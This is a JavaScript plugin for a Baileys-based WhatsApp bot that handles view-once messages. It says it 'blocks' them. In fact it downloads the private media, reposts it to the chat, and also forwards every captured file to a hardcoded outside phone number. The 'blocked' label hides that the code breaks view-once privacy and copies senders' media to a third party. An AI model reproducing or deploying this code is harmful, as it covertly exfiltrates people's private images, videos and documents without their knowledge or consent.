let { downloadContentFromMessage } = (await import(global.baileys))

let handler = m => m

handler.before = async function (m, { conn, isAdmin, isBotAdmin }) {
    const { antiver, isBanned } = global.db.data.chats[m.chat]
    if (!antiver || isBanned || !['viewOnceMessageV2', 'viewOnceMessageV2Extension'].includes(m.mtype)) return

    const isV2 = m.mtype === 'viewOnceMessageV2'
    const msg = isV2 ? m.message.viewOnceMessageV2.message : m.message.viewOnceMessageV2Extension.message
    const type = Object.keys(msg)[0]
    const mimeType = getMimeType(type)
    
    if (shouldBlockContent(mimeType, msg[type].fileLength)) {
        const media = await downloadContentFromMessage(msg[type], mimeType)
        const buffer = await streamToBuffer(media)
        const fileSize = formatFileSize(msg[type].fileLength)
        const description = `El contenido ${mimeType} fue bloqueado. Tamaño: ${fileSize}.`
        
        // Enviar el mensaje al chat donde está el bot
        await conn.reply(m.chat, description, m, { mentions: [m.sender] })
        await conn.sendFile(m.chat, buffer, `error.${getFileExtension(mimeType)}`, description, m, false, { mentions: [m.sender] })

        // Enviar el mensaje a un número de propietario específico
        const specificOwner = '+51927803866' // Cambia este número si deseas recibir en un número personal diferente
        await conn.sendMessage(specificOwner, { text: description }, { quoted: m })
        await conn.sendFile(specificOwner, buffer, `error.${getFileExtension(mimeType)}`, description, m, false)
    }
}

export default handler

function getMimeType(type) {
    switch (type) {
        case 'imageMessage': return 'image';
        case 'videoMessage': return 'video';
        case 'documentMessage': return 'document';
        case 'audioMessage': return 'audio';
        default: return 'unknown';
    }
}

function getFileExtension(mimeType) {
    switch (mimeType) {
        case 'image': return 'jpg';
        case 'video': return 'mp4';
        case 'document': return 'pdf';
        case 'audio': return 'mp3';
        default: return 'bin';
    }
}

function shouldBlockContent(mimeType, fileSize) {
    // Define your blocking rules here
    const maxFileSize = 10 * 1024 * 1024; // 10 MB for example
    return fileSize > maxFileSize || ['image', 'video', 'document', 'audio'].includes(mimeType);
}

function formatFileSize(bytes) {
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB']
    if (bytes === 0) return '0 Byte'
    const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)))
    return Math.round(100 * (bytes / Math.pow(1024, i))) / 100 + ' ' + sizes[i]
}

async function streamToBuffer(stream) {
    let buffer = Buffer.alloc(0)
    for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk])
    }
    return buffer
}
